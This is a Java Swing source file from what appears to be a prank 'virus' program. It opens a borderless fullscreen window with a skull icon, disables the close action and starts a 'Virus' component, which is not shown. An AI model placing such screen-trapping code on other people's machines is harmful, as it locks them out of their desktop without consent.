import javax.swing.ImageIcon;
import javax.swing.JFrame;

public class Window {
	
	public Window(String title, Virus virus) {
		
		JFrame frame = new JFrame(title);
		
		frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
		frame.setUndecorated(true);
		
		frame.add(virus);
		
		frame.setResizable(false);
		frame.setLocationRelativeTo(null);
		frame.setVisible(true);
		
		ImageIcon img = new ImageIcon(ClassLoader.getSystemResource("skull.jpg"));
		frame.setIconImage(img.getImage());
		
		frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		
		virus.start();
	}
}
